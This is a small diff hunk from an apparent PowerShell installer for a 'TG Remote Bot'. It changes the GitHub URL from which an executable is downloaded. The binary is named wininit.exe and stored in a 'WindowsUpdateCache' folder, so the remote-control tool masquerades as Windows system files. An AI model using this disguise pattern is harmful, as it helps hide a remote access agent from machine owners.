@@ -25,7 +25,7 @@ $Dir     = "C:\ProgramData\WindowsUpdateCache"
 $ExeName = "wininit.exe"
 $ExePath = Join-Path $Dir $ExeName
 $TmpPath = Join-Path $env:TEMP $ExeName
-$Url     = "https://github.com/cecon123/tg-remote-bot/raw/refs/heads/main/dist/wininit.exe"
+$Url     = "https://github.com/cecon123/tg-remote-bot/releases/latest/download/wininit.exe"
 
 Write-Host "=== TG Remote Bot Setup ===" -ForegroundColor Cyan
 
